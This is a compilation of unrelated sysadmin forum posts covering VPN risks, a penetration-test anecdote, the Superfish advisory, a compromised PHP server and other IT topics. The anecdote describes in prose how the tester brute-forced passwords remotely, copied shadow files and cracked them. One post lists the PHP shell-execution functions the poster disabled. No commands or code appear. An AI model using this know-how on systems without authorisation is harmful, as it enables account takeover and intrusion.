ensure you have some form of secondary authentication. Most providers support a callback feature, a code word system, anything that can protect you from a social engineering attack can save you time, money, and sanity. Let this be a reminder that no matter how secure you may be internally, anytime you use a host that you don't directly control, your security is in their hands. "

There is currently close to zero trust relationships between these enclaves except for firewall exceptions to allow admins to get into systems. The LAN has a domain. The DMZ has another domain, and then the customer enclaves may be workgroups or seperate domains.

The problem with utilizing VPN software to connect to work resources is that end users are creating an open tunnel between their home and corporate networks. This method allows full remote access to the entire work network from outside the office, bypassing most firewall rules (the VPN connection is technically initiated from inside the work LAN). In most cases, the entire corporate network is accessible to the remote worker, exposing all servers and desktops rather than just the resources needed. In this scenario, any security vulnerability or malware present on the remote workers computer and network can infect the work network for the duration of the VPN connection. This includes viruses. For example, if the remote PC has a nasty virus, it can spread across the VPN to the corporate network and could bypass work firewall protections. In addition, if the remote PC is compromised, it could be used as a conduit directly into the office LAN where hackers can exploit vulnerabilities to gain unauthorized systems access. For example threats such as the Cryptolocker viruses typically rely on Windows file shares (SMB) to encrypt files are exposed. The following is a home VPN user scenario that keeps IT managers up at night: A remote teleworker is connected to the VPN from their home PC and gets infected by Cryptolocker. At the time of infection, they happened to be mapped to a corporate network drive. Perhaps they pay the ransom or perhaps not (maybe they don't because they have backups of the work on their own home machine). The timer lapses and the teleworker runs a malware cleaner to remove the infection. They're relieved, but unaware that they've encrypted several files on our network drive due to the original infection. They don't think to inform the IT department, because it's an issue with their home PC and not ""work-related. A few weeks pass and other workers discovers that a file on the network drive won't open. They flag it to the IT department. The IT team restore the file from backup, but unfortunately it turns out that only encrypted files have been backed up for the past 4 weeks So the company has now lost the data as a result. This situation could become exponentially worse, as thousands of network files could be encrypted and the business would never know until somebody tries to open them and is unable to do so because of the infection. What are folks doing to secure their VPN clients to reduce these concerns?"

Total rooms is around oh let's say 1200. All properties are fairly high end, with suites in the $600 per night range on the coast of California. Each site has the most ramshackle collection of equipment and backwards designs I've ever come across. Here are some of the highlights: * Firewall/Router/Gateway: Custom made solution. Running old version of FreeBSD using PF and a terrible GUI overlay that has limited functionality, no input validation, and no HTTPS for login or transit. No DHCP (""security vulnerability""). Has no logical content filtering, it blocks every website automatically unless you put in your email address (has to be on a verified list that is input manually) and then it unblocks it for 24 hours before reblocking it. Most TLDs other than .com, .net, .org. , .edu are blocked. Outbound egress is blocked unless explicitly approved. * Network switches: 90% are EOL Ciscos. None are gigabit. All 10//100, many have duplexing disabled (""causes issues""). ""Trunks"" are just being used as uplinks, no trunking is actually being done (ie LACP). The 10% that aren't ancient Ciscos are garbage old consumer switches. There's even a few hubs. CAT 5E runs routinely exceed 400-500 ft. * Servers: Lots of Server 2003. The latest server he tried to deploy was Server 2012 R2, and he tried to do some weird trust relationship between its netbios name and its FQDN and messed it all up completely. Brand new file server using NL-SAS drives in RAID 1 (with aggressive caching, I was able to get 220 MB/sec write and around 180 MB/sec read). * Consumer grade WiFi. Using EnGenius, no thought to AP placement or channel utilization/RF power. Naturally, barely works right. Another property has EOL Cisco Aironet's and a even more EOL controller for them. Again, barely works. Put a directional antenna on top of the roof thinking it would cover the pool area. Sure, in a 5 degree arc. * Home brew help desk. Awful input validation, no email to ticket functionality, cumbersome. Lots of features half baked or don't work at all. * Backups: Using a script to do robocopy. No imaged based backup, so of course AD isn't being backed up. Backups being stored on various computers around the property on WD green drives over 100mb network links (takes like 12 hours). * Paranoid to the Nth degree. Nothing cloud based or even remotely internet based. Security risk. No remote access to sites except approved IP addresses. No remote CCTV access. No webcams. No DHCP. Computers are often behind locked cabinets. Yet he didn't understand how client isolation works on the WiFi, so everybody gets to see everybody... * One property has a phone system running OS/2 warp. I kid you not. * ""New"" workstations were usually running Pentium dual cores with 2 or 4 GB of RAM. Now I'm stuck holding the bag. I'm not one to normally bash on other IT folks, as we all have our own opinions - but this is just embarrassing. Literally the week before I started, he quoted out a ""new"" Cisco switch that was EOL in 2008. I just don't get it. We're talking probably, according to some rough budgeting I've been doing for the rest of the year and 2016, close to $500-$750k in infrastructure overhaul because we're basically sitting in 2006. The management had no idea, and was under the impression everything this guy did was gold. Anybody else ever had a similar situation? I'm very slowly starting to replace things...Meraki MX100's for the new router/firewall/gateway's, Meraki APs for the wireless (they work amazing for the hospitality industry) HP switches... At least I know I won't be bored anytime soon!"

I am in no way claiming this to be my own, but it was funny and I thought you guys would enjoy it. """""" Hey guys, I recently did a security audit for a small business, and I thought some of you might get a kick out of this story. I am an IT consultant that specializes in security applications and network security infrastructure, and on the side, I do a handful of penetration tests when they come up, and do a bit of writing here on the forums and elsewhere. A little over a month ago, I was asked by a friend to help him out with a security assessment for a small legal firm that suffered from an attack. I figured it would be a nice but of side-work, and not much else was going on, so I agreed and contacted the owner the same day. I cannot release explicit details about the company because they still have some security issues to work out, but I'll try to be as detailed as I can. So, this company owns a couple of production servers, one of which maintains their website and a SQL database that contains a long list of case-files. They sell subscriptions to lawyers nationally to access these files for reference material and support for their cases and stuff like that. About 70% of their income, I would say, relies on this server's integrity and availability to their customers. Essentially what happened was, they hired some outsourced development team from the Ukraine to build the back-end database and create the search-feature so their customers could easily reference those casefiles. The company was slow to pay their bills, and withheld the final payment from the developers until they finished the job. They refused and insisted on payment. The company decided to fire them after their refusal and did not send them their final payment. Instead of finishing their job, the developers decided to break into the production server and shut down the website. The next day, they started wiping files and kicked the server off after deleting the root-level passwords. By the time I had come into the job, this had already happened three days prior. Basically, they wanted me to do a malware and rootkit removal to guarantee their server was clean and to search for any other threats that they would need to fix later. Here is where it gets hilarious. Their administrator that they hired to host and secure their production server is a total egotist. What originally was a job to secure a web-production server became a mission to make this guy eat his words. Here is the timeline of events: - The first day the hack occurred, at around 4am, it appeared to be a denial of service attack, according to the administrator by the time everyone woke up. - What had actually happened was the attackers logged into the Webserver and deleted the front page. They then shut the server down and knocked off a backup. - The administrator finally realized the actual nature of the attack, but did not report it. He claimed that they got into the server by brute forcing the owner's password which was supposedly weak. He claimed to have it under control. He was told to disconnect the server until it could be assessed. - The following day, the attackers returned, this time, deleting the entire database, the website, and root passwords. Again, the website was knocked off. - The administrator insisted this was not possible. Nevertheless, there it was, a 404 error across the entire site. It was at this point my friend was brought in to investigate. - The administrator claimed that the issue must have been caused by weak passwords and blamed the owner, and that there was no other way the attackers could have gotten in becaus hr was a ""Security Genius"" - He also claimed to have hacked into NASA, worked for the FBI to avoid jail time, which was his excuse for having NO certifications to his name other than compTIA A+, and later he claimed that he hosted TripAdvisor... - My friend, also a penetration tester, asked me to help him with the audit and to help me prove this guy was a fraud. When I was told what this guy's ""resum"" was, I nearly passed out from laughing so hard. I asked for sudo-access to the server, which I had to wait two days for while he bitched about the owner hiring me and my friend to ""insult his abilities and intelligence."" He refused to give access to us, claiming that it would be a security risk. I told him that his server was already compromised and that there was no way he could guarantee it was secure, especially after restoring the last backup they had available (which was 30 days old). Instead of waiting for him to quit dragging his feet, we took the initiative and did some initial assessments. Port scans, vulnerability scans, and so on. We found numerous vulnerabilities attached to the website, courtesy of Nikto, including numerous HTML injection and SQL injection vulnerabilities, and at least one instance of an XSS javascript vulnerability. That was not the worst part... the Webserver was running it's http services on Apache Coyote v1.0. We later discovered that the web service had never been updated. This still isn't the worst part... After the admin reluctantly delivered the password, and I waited two hours for him to give me the fucking IP address so I could actually SSH into the damn thing, I found even more rediculousness. The ROOT password was a permutation of the company's name... increadibly fucking easy to guess. If I had to compare it to a similar password, it would be like me making my password: ""trueDEM0N"" except it only had 8 characters... The last password change for the root password matched the day of the server's OS installation. I was pretty pissed, but I went on silent until I did a full assessment of the server. It gets worse than this... I originally did what I was told. Run a virus scan, search for any rootkits or backdoors, and go from there. I was shocked to find that there was not one, single instance of a backdoor or malicious code anywhere on the system...especially considering what else I did not find... There was no Antivirus software installed on the system. I also found no host-side firewall, which would explain why my Nmap scans were not bounced when I ran a full TCP connect scan... For shit and giggles, I decided to brute force the password that was given to the developers along with the four other user-level accounts. I was hopeful because I noticed that he had hashed the shadow passwords in SHA-512, and even salted them. I tried Hydra first, just to see if it was possible to crack the password remotely. It connected and had utterly no problem letting me hammer away at the server's passwords. The administrator never even knew I was attacking the passwords remotely, whicheck told me there was no network IDS. I even downloaded the passwd and shadow file with scp without any complaint from the server. No file restriction whatsoever... it didnt even so much as demand I re-enter the password, throw a warning banner, or anything. I used Hashcat to attack the passwords with a full keyspace bruteforce attack. I let it run on my shitty laptop overnight and into the afternoon the next day while I was at work. It resolved every single password by the end of those 16 hours. Bear in mind...thus was a Phenom II quad-core 1.8ghz processor running Intel graphics... and it only took 16 hours... But it gets even worse... The developers' password had not been changed since the day it was created...had sudoer access...and was an exact match of the root password...along with two of the other usernames. Essentially, he gave the developers their own username, using the same password as the root. I called the owner immediately to tell her my findings, and came to find out that this administrator had charged their credit card for ""overtime"" that he spent responding to the hack that was his fault in the first place. He claimed that it was his job to host the server. Any time spent doing backup/recovery, malware removal, and security response was considered ""extra work."" He followed up by blaming them for not having an off-site backup solution in place and told them that it was not his job to recommend or provide backup solutions. He further insisted that they would never find anyone who could use node.js and manage a linux server, and proceeded to insinuate that neither of us knew what we were doing. At this point, I lost my shit. I took copies of every log on that system and phoned the owner and her staff and conference called them to deliver my initial report. The owner was furious, to say the least, and I was graciously given the satisfaction to call the administrator out in front of everyone over the phone. I even sent them the Whois report on trip advisor to prove he was completely full of shit. They are entirely self-hosted...not that we couldn't already guess that. Not only was he fired, but they are currently trying to find a way to file charges against him for fraud and negligence. Unfortunately, they never signed an official contract with him, so the terms of their agreement were never determined. They have since migrated their server to another domain host and are still reeling from the damage done to their company and reputation. The administrator has been, essentially, publicly shamed, at the very least, and to my knowledge is going to be losing a lot of business. I doubt he will ever work as anything more than a Level 1 help desk peon for the rest of his life...if that. I laugh because the guy was totally full of shit, but I feel just awful for the poor sicker he scammed. The best I could do for them was heavily discount their assessment since it literally took me less than a day of actove work-time to give a full assessment. For the sake of the administrator and the company's anonymity, I will not be revealing either of their identities. To do so would be professional and I would like to thank the user ""Donalen"" for having the courage to call me out on my unprofessionalism for even entertaining that thought.What I can tell you is that, it came out that his servers were located in an outdoor barn, that he has no record of working for the government, has never worked for the FBI, and his only instance of being a ""hacker"" was when he was prosecuted for defacing a website. If my partner, who I'd like to thank for bringing me in on this job, wishes to reveal himself, feel free, dude. Take a bow. I hope you guys enjoyed the story as much as I enjoyed this job, despite everything that came out of it. It really reminded me of how important it is to verify certifications. This has definitely been my ""worst case scenario"" of the year. To you server hosts and web developers out there, don't be that guy. And to you site/business owners, always perform solid background checks and certification verification. It results in far less heartache for everybody. Thanks for reading everybody. """""""

But thats the future. Lets talk about the current problems with patch management in organizations, big and small. In a recent SolarWinds security survey, 62% of the respondents admitted to still using [time-consuming](URL manual patch management processes. Does this mean IT managers are not giving due attention to keeping their servers and workstations up-to-date? **NO**. Of course, security managers and system administrators know how much of a pain it is to have a 'situation' on their hands due to a bunch of unpatched, vulnerable machines in their environment. *Its never fun to be in a fire fight!* However, having a manual or incomplete patch management process in place is equivalent to having nothing at all when deploying patches as vulnerabilities arise from: * Potentially unwanted programs * Malware * Unsupported software * Newer threats (check [US-CERT](URL As a security manager or system administrator, what do you think are the common challenges that come in the way of realizing an effective patch management process? Here are a few common issues: * Inconsistent 3rd-party patching using the existing Microsoft WSUS and SCCM solutions * Complexity in addressing compliance and audit requirements * Complexity in customizing patches and packages for user and computer groups * Administrative overhead due to an increase in BYOD usage in the environment Given the frequency and scale of cyber-attacks and data compromises, having a thorough patch management process is a **must-have**not a nice-to-have. But how fast can you put one together? If youre already managing patch deployments in your organization with WSUS, youre covered for Microsoft applications. You just have to implement a process for automating the patching of non-Microsoft (or 3rd-party) applications like Adobe, Java, etc. WSUS also has its own limitations, like limited hardware inventory visibility and an inability to provide software inventory information. Having inventory information is crucial when youre formulating a comprehensive patch management strategy. The strategy should accommodate flexible and fully-customizable patch operations so the regular business activities dont feel the impact. Or, you can count on having an oh-dear moment, complete with a blank stare as you wonder Why is this server rebooting at the wrong time and hurting my business? There are just too many pieces that must fall in place for an effective patch management strategy. If you dont have one, you might begin by asking yourself 1. How am I planning to look out for newer security threats, and regular hot-fixes/patches? 2. How will I assess the impact to my systems/business if I manage to identify the threats? 3. How will I prioritize the patches that may affect my systems right away? 4. Whats the back-up/restore plan? 5. How will I test the patches before rolling them out to production systems? The notion should be to not let patch management become a fire-fighting exercise. Even if it does become a fire-fighting exercise, the process should be clearly defined to minimize the impact of the security threat. Effective patch management should become a good security practice to protect the IT systems from security threats, stay compliant, and eliminate business downtime and data compromises. Well, now. What do you think is stopping you from getting *one step* closer to an ideal patch management strategy in your organization?"

So today I was logging in to my company's web based portal. This portal contains all of our business critical applications. It is also accessible from the public web. I've been using this site for a little while and just now noticed the connection to the site is unencrypted, including the login page. This is obviously a terrible situation and leaves the company extremely vulnerable to security breaches. I wanted to test this out, so I setup Wireshark and began capturing packets right before I submitted my credentials. And guess what... I found my password in plain text. I'm a sysadmin, but my direct supervisor is not in IT at all (this place is weird, I know). Should this be address to him or to the higher-ups in IT/management? Would I be going over my boss's head if I went directly to them instead? Would I risk getting into any trouble with $company for using Wireshark to capture my own credentials? I'm going to bring this up with my boss. I drafted an email, but I'd like for you guys to look it over and let me know what you think. I want to make sure it's accurate and gets the point across (since he is not IT). I'd appreciate any and all responses :) &gt;Good afternoon, &gt;As I logged in to management tools today, I noticed that the connection to the login page was not encrypted with SSL. This is a HUGE security issue. Anyone who would want access to our credentials would have a very easy time getting them because the credentials are sent over the public internet to $company servers in plain text. &gt;To demonstrate how dangerous and how easy it is to capture some credentials, I used a packet sniffer and was able to catch my own credentials in seconds. Anyone with a packet sniffer and the motivation could do the same. All an attacker would need to do is get on a network in common with, or some network in-between, the user and $company  then set up the packet sniffer, and wait for someone to log in. Ive attached a screenshot demonstrating this vulnerability. *The screenshot was of Wireshark and the packet with my credentials in plain text. I blacked out my password.* &gt;Just to be clear, this demonstration was carried out on my own private Internet connection and no one's credentials but my own were captured. &gt;Bottom line, there is no reason at all for a login page to not be encrypted. IT and management should be made aware of this serious lapse in security ASAP. &gt;Regards, &gt;mabbass"
852,vulnerability,sysadmin,Sysadmin now doing network engineer role too -- salary advice?,0,3cfwxs,http://www.reddit.com/r/sysadmin/comments/3cfwxs/sysadmin_now_doing_network_engineer_role_too/,2015-07-08 02:31:50,"Hi /r/sysadmin, I know the compensation topic has been beaten to death, but I'd really appreciate some advice for my specific situation, as I have no easy comparison data for my role. **Background:** A little over a year ago, I took over the Sr. Sysadmin position at my organization. Prior to this, I worked for them as the marketing department lead for three years. In a nutshell, my track record (and background) was strong enough that they skipped promoting the Jr. Sysadmin of two years to give me the position. Just to note, his skills are lacking. Ive tried to train him, give him books/videos, etc. but he doesnt have a true love for IT and thus doesnt care. Hes essentially helpdesk. When negotiating, we agreed upon a set of responsibilities which consisted of the old Sr. Sysadmins duties plus I would handle the more technical work for the marketing department still (web design, email campaigns, web hosting, etc.). We agreed upon a salary of $57,000, under the assumption the Jr. was capable of doing his listed responsibilities and the Network Engineer his. Over the past year, Ive come to find I actually need to do more than half of the Jr.s duties because he isnt capable. **Current Situation:** Fast forward three months into my current role: our only network engineer of 10+ years (CCIE) leaves the company. He was in the middle of a few different projects and was unable to finish them before his departure, and I couldnt get any local MSPs to finish it for us. So, like any good sysadmin, I did the needful. Pretty much got myself CCNA-ready in three weeks and finished his projects up on schedule. Since then, Ive been handling all of the networking, alerting, and infrastructure for the business and our multiple locations. Just to provide some context, I had to finish an MPLS installation and configuration for our site-to-site and as a failover circuit, while also upgrading our ASAs from 8.2(5) to post-8.3 to eliminate an SSL VPN vulnerability that was causing us to fail PCI compliance as my first two networking projects. A month later, a vendor we entered a large contract with fails to provide their own network engineer, so I have to handle the configurations of their on-site equipment. Long story short, I did the configurations and ended up fighting them tooth and nail to use our existing failover circuits for their system, saving the company upwards of $80,000. At this point, Im now responsible for: 3 sites, 130 users, 150 endpoints, 5 industry-specific systems, 15 servers, on-site Exchange server, 18+ printers, PBX phone system, all networking circuits + gear (primary, failover, and customer), on-site &amp; off-site backups, all monitoring/alerting, management of all company devices (iPads and mobile phones), purchasing of all licensing &amp; equipment, compliance standings, all web design + hosting, various marketing support, continued upkeep of employee portal, SSL certs, and anything else that comes up on the daily. **Question:** How much additional compensation should I be requesting now that Im responsible for all of the network engineer responsibilities and duties? **TL;DR:** * Took over IT Dept. as Sr. SysAdmin a little over a year ago * Network Engineer left and I have been doing all responsibilities for ~1 year * What is a reasonable salary request now that I am doing 2+ jobs?"

Here's the scenario: One of the hosts I manage is a Apache/PHP server, running a few applications. It is pretty legacy, as I depend on developers on my company to migrate all the code for newer versions of PHP and a more hardened and enterprise-oriented environment. This guy runs Slackware 13.37, Apache 2.4.12 and PHP 5.4.7. Despite some flexible configs in terms of OS security, it has the basic set of rules for minimum security (sshd limited to mgmg network, root login disabled and strong root password, only ports available publicly are 80 and 443). We have disabled in php.ini most functions that could lead to shell access within PHP applications, like dl, exec, passthru, shell_exec, system, etc. Apache runs as unprivileged user. With these in place, I figured even if there was a vulnerability in one of the poorly written applications, privilege escalation would not be possible and the operating system would be fine. My mistake. A few days ago we found log entries on other hosts for ssh login attempts (visibly automated, as it followed a pattern) coming from this host. Upon further investigating, I'm sure the host is compromised, but I can't tell how. Logs from the time of incident were unavailable, except for eth interface going into promiscuous mode. No trace and not likely that the attacker got in via SSH, I'm pretty sure the point of entry was some web application. There also was a file 'bios.txt' in /var/log, containing a list of IP addresses and owned by root, which, after some googling, lead me to a tool commonly referred to as 'gosh'. Basically, once an attacker is able to run code on the machine, he downloads this package, runs a set of scripts to scan the network for vulnerable SSH hosts and calls home. Any insights on how it would be possible for an attacker to escalate privilege and run this stuff on the system, coming in from a PHP remote code execution? Is it an option that it never left the PHP realm, running all this without shell access? Any hits on where I should look more carefully to better understand what happened? Thank you very much for your time and sorry for the poor english."

What is everyone's opinion as to what's generally accepted as common/better (best?) practice in regards to vulnerability scans and host based firewall rules? I realize that if a network scanner sits in network segment ""A"" and there is a hardware firewall sitting between it and network segment ""B"" then traffic from the scanner's IP address must be open to reach hosts/devices in the ""B"" segment; however, all my hosts within those segments also have host based firewalls running. As such, I have each host based firewall locking down access to listening services (SSH, NFS, RDP, etc.) open to/from specific IP addresses (i.e. SSH and RDP only open to/from that environment's jump host(s)). My problem is if I am running a service that is vulnerable, say an out of date version of OpenSSH, the network vulnerability scanner will never trigger or report said vulnerability as the host firewall will drop the traffic. Do I open my host firewalls to allow all traffic from the scanner IP and give a false report of running/attackable services (given they can only be attacked from another host on specific ports/services which itself runs a firewall of its own and is hardened, etc.) or do I treat it as this is my network, as configured, and unless you can compromise another host somehow you're (in theory) not gaining easy access to any running service(s) on this specific host being scanned?

How did you deal with the resulting failure and what would you have changed? 3) Give me an example of good threat management. 4) Lets say a new vulnerability like Heartbleed comes up. How should an organization defend against it, and walk me through the steps that could have been taken to prevent it, and the first things that should be done in order to mitigate it, and what needs to be done afterwards?

There is an office with about 15 computers where their Outlook clients suddenly stopped connecting to their POP server mid day, specifically: Receiving reported error (0x800CCC0F): 'The connection to the server was interrupted. If this problem continues, contact your server admin or ISP' This comes up immediately when hitting Send/Receive. I haven't been able to find a fix and I was wondering if anyone might have any insight. Here is what i have checked out so far: * Server anti-virus and firewall are not blocking the in/out traffic for the POP IP or ports 110/25/995/111. Their POP connection is standard 110/25 * Workstation AV and FW same as above and I have disabled both on server and workstation with no results. * As far as I can tell, Cisco router is not blocking POP traffic. * Rebooted the server and Cisco router after hours with no luck. * Creating a new PST does not work. As well as setting up an email that isn't related to theirs. Same problem. * Can't reboot the POP server because their are on a shared server from the provider. However, that shouldn't be the case because anyone outside their internal network but within the same company can receive emails. * Inter-office I can ping the POP and SMTP server successfully. However, when I Telnet into the POP server, I can't establish a connection. I can establish a connection when I Telnet to the POP server outside the network. I can provide some more information if needed. It is a strange issue and I can see it all over TechNet but usually with no solution. I have already contacted their ISP to do intrusive testing on the T1 after hours, but I don't know if that will help anything. Is it possible that something like this can be caused at or outside the Dmark? **EDIT** Just wanted to say thanks for the help in here. You guys never disappoint. I was able to capture SMTP traffic and when looking through it noticed a MASSIVE amount of email originating from the Server. Traced it to a module that the company uses as their industry software. This software can send emails through standard SMTP and it seems that there must be some vulnerability because the server was sending out email at a rate of about 1000 message an hour. Their email provider blocked their external IP. Why they only blocked the POP access and not SMTP is beyond me; but that is what made this all the more confusing. IP was unblocked and emails flowed in. Now it is just damage control time. Thanks. "

Some studies have estimated that it is installed on 90% or more of Windows computers. An important reason why many users have needed Adobe Flash Player is to watch YouTube. YouTube has made a change, however, and suddenly Adobe Flash Player looks much less attractive as an option for users. Adobe Flash Player has a long, ugly history of security bugs. One site lists 408 security bugs fixed since 2005. URL That does not include any bugs that are present in the software and are not yet fixed. As of today there have been three emergency patches issued by Adobe for Flash Player in the past two weeks. URL In 2013, Adobe suffered a massive security breach into its internal networks. Rumors and stories abounded that attackers stole source code from Adobe. URL In its wisdom, Microsoft decided to bundle Adobe Flash Player inside Windows 8 and not give users an option to remove it. This has continued in Windows 8.1. It is directly integrated into IE 10 and 11 on Windows 8.x, desktop or ""metro."" If you were going to have Flash Player anyway, there is one benefit. Updates for Flash Player are distributed in the Windows 8.x built-in updating service. URL That doesn't help if you don't want it in the first place. Current beta releases of Windows 10 continue to have Adobe Flash Player built-in. URL As noticed in a recent thread in r/sysadmin, YouTube no longer requires Flash Player. URL In fact, on any modern browser, just the browser, without Flash Player, you can apparently now view any Youtube video. Youtube allows this. You apparently do not need to manually sign up within Youtube for the HTML5 experience. It just happens. Adobe Flash Player (the built-in one for IE) is still installed on Windows 8.x even when it is not listed under Programs and Features. It is not available to uninstall under ""Turn Windows Features On or Off."" It is not uninstalled when you run Adobe's official tool for uninstalling Flash Player. The built-in IE Flash Player, however, can be disabled under Tools | Manage Add-ons. Yes, you can find articles on the Internet that show how you can manually delete the files from Windows 8.x. It is too bad, however, that Microsoft does not provide that as an option. Fortunately, there is a way to disable Flash Player from working in the IE browser. With the YouTube change, I am going to start uninstalling Flash Player from computers I manage in hopes that users won't notice the difference, any browser, any OS. (Note: just underscoring the point, this discussion is specific to IE on Windows 8.x+.) "

We have proprietary code that runs on Linux, and distribute it as part of a pre-build system to our customers. My job is as a Linux systems engineer (along with support of our application) -- basically, since a lot of our customers don't have in-house Linux/Unix staff, my dept. acts as an out source sysadmin for the product stack we sell. I also help out with development, and in some cases I've had to back port security patches for some of our customers that are on out-of-support OS releases (things like the recent BASH vulnerability). The problem is that we don't have a corporate open source policy which covers what I do. So even though the GPL requires source distribution (and associated license grants) for any modifications we make to GPL code, and I have no problem providing that, I'm not sure that all levels of management is aware of that obligation. So I'd like to approach them with putting together a blanket policy, that if they have me modify a GPL (or other copyleft licensed) program for distribution, that they also authorize me to distribute the source (since any source that I write could be seen as company-owned code, I want there to not be any confusion -- and also don't want management to get needlessly freaked out either). So I'd like to see if I can round up some various policy clauses, depending on what the company wants to do. For example, they may decide that I can only work on modifying open source programs (for distribution) after getting signoff on each project. Or they could decide that is too much paperwork and just give blanket authorization, as long as the original code was already open source. Add in maybe a clause stating what my obligations / permissible activities are when working with the community (do I present issues or solutions under my name or the companies, for example). Also, I'd like to see in the policy language to the effect that it is not OK for the development staff to ""borrow"" code from an open source and incorporate it into our proprietary product. Not that there is much chance of that happening now (due to the uncommon framework we use), but just to cover the future. Am I opening a big can of worms with this one? I do know that some levels of management are familiar with some aspects of open source, esp. since one of our products is built on Linux, but I'd rather at least have some good references or pre-written example policies (covering various levels of openness) to present to my boss, and up the line."

This software intercepts users web traffic to provide targeted advertisements. In order to intercept encrypted connections (those using HTTPS), the software installs a trusted root CA certificate for Superfish. All browser-based encrypted traffic to the Internet is intercepted, decrypted, and re-encrypted to the users browser by the application - a classic man in the middle attack. Because the certificates used by Superfish are signed by the CA installed by the software, the browser will not display any warnings that the traffic is being tampered with. Since the private key can easily be recovered from the Superfish software, an attacker can generate a certificate for any website that will be trusted by a system with the Superfish software installed. This means websites, such as banking and email, can be spoofed without a warning from the browser. Although Lenovo has [stated](URL they have discontinued the practice of pre-installing Superfish VisualDiscovery, the systems that came with the software already installed will continue to be vulnerable until corrective actions have been taken. The underlying SSL decryption library from Komodia has been found to be present on other applications, including KeepMyFamilySecure. Please refer to CERT [Vulnerability Note VU#529496](URL for more details and updates. To detect a system with Superfish installed, look for a HTTP GET request to: [superfish.aistcdn.com](superfish.aistcdn.com) The full request will look like: URL Where [ACTION] is at least 1, 2, or 3. 1 and then 2 are sent when a computer is turned on. 3 is sent when a computer is turned off. **Impact** A machine with Superfish VisualDiscovery installed will be vulnerable to SSL spoofing attacks without a warning from the browser. **Solution** Uninstall Superfish VisualDiscovery and associated root CA certificate Uninstall any software that includes the Komodia Redirector and SSL Digestor libraries. In the case of Lenovo PCs, this includes Superfish Visual Discovery. It is also necessary to remove affected root CA certificates. Simply uninstalling the software does not remove the certificate. Microsoft provides guidance on [deleting](URL and [managing certificates]( URL in the Windows certificate store. In the case of Superfish Visual Discovery, the offending trusted root certification authority certificate is issued to Superfish, Inc. Mozilla provides similar [guidance](URL for their software, including the Firefox and Thunderbird certificate stores. **Revision History** February 20, 2015 "

I'm working within vulnerability remediation efforts to resolve a shit ton of backlogged old vulns within my environment. I keep coming across the aforementioned vulnerability (QID 38602 for those who are familiar with Qualys). It's being shown as vulnerable to the following CVE's: * CVE-2010-5298 * CVE-2014-0076 * CVE 2014-0195 * CVE-2014-0198 * CVE-2014-0221 * CVE-2014-0224 * CVE-2014-3470 Now, the thing is, being an OpenSSL vuln, I initially assumed it was outdated openssl installed, thus made packages for the latest and greatest ,etc. Tested installs, ran another scan... still vulnerable. Now with all my digging, the only commonality with all these servers having this vuln is an outdated version of Splunk...which of course is coupled with OpenSSL (0.9.8p). I've been trying to get splunk updated and test to see if this resolves but I have a feeling some will still linger thus still give me a headache. The kicker though, is with the raw qualys scans I get the port which the vuln was found on. They vary WIDELY. Anyone else deal with anything similar or better yet this exactly? Without openssl explicitly installed, why would they be vulnerable to that? Is it more a protocol thing as opposed to the actual libraries/software? Worth mentioning, these are all windows machines.

The remote system is running an NFS server which is configured in such a way that it allows unauthenticated users to manipulate the file system using unverified credentials. This can be accomplished by spoofing the user ID (UID) and group ID (GID) values in NFS RPC call packets. **Impact:** An unauthenticated network-based attacker can leverage this misconfiguration issue to access and modify sensitive files that are present on the remote system with super user privileges.

Regular sysadmin scheduled task to check vulnerability lists. 1. Insert vulnerability into some type of system to track status (Excel?). 1. Update status to include list of vulnerable vendors and correlate to our installed systems. 1. Identify patched version numbers. 1. Track when individual systems are patched. 1. Roll-up statuses to make sure things aren't missed. **Do you guys just track them all by CVE number, or do you just handle each vendor separately?** It gets tricky when a company like VMware has their security advisories tied to patch releases. For example, [this advisory](URL covers 6 different CVE entries. Of course, this is even more trouble when you have a big CVE like ShellShock that covers dozens of vendors. **Do you have some tool to track them or are you just using Excel, Access or Plain Text?**"

I was tasked to read over the departments SOPS for on-boarding via a confluence write-up article. That's when the real fun started I didn't have any permissions or rights to view this article, so I requested a ticket be put in for access. There was tons of confusion by other team members, who thought I should have access. I literally sat around for days waiting for access. FINALLY, I spoke with the right person with the help a co-worker who wasn't even tasked to help me out but did. I was granted access, only to find out the entire on-boarding document was incorrect or dated.. Can't make this stuff up! I submitted for a access request for additional group memberships only to be shut down by another department basically saying this process is old and dated... Why are you contacting me???

Back in January [I posted on this sub](URL that an evil new parent company had acquired my employer and laid off a bunch of us, including yours truly, and that I was about to start my new job as a python developer at a cybersecurity company. I was asked to come back and give an update, so here it is. At first, there was a huge learning curve: learning the existing code base, certain python features I'd never seen before (e.g, decorators), the collaborative aspects of git and bitbucket (until I took the new job, most all of my projects had been solo adventures), mongo, the mechanics of doing a release (release branching and Jenkins), etc. After about a month, I felt comfortable taking on small tickets, and now I'm regularly knocking out big ones. At my previous job, I was always struggling to keep up with the rest of the team, owing to a huge experience gap. Pretty much everybody on my team had been with the company for 10+ years and were very familiar with their tech stack, where I was new to the company's tech and the job did not really allow for mistakes, hence relatively few opportunities for learning and growth. At the current job, I'm roughly on par with teammate #1 (a friend and former-coworker who convinced me to apply here) and we're both far behind teammate #2 (who is a coding god). My current employer has weathered the pandemic quite well. Business is booming, in fact, thanks largely to forthcoming government regulations that require companies to buy our product (or one of our competitors' products). And they really do care about the health and welfare of employees. Since March, the company has allowed almost everyone to work entirely from home (the only people going into the office are the two sysadmins and the CEO). I was a little sour about taking the job here because it was a 10% salary decrease from my previous job, but I have since learned through the grapevine that after covid hit, the evil parent company that took over my previous employer instituted a 10% across-the-board pay cut for the ones left after the layoff. So I'm earning here what I would have earned there, and adding a new set of employable skills in the process. Overall, I'm feeling pretty good about the switch. And relieved to have a reliable employer even while the rest of the world burns."

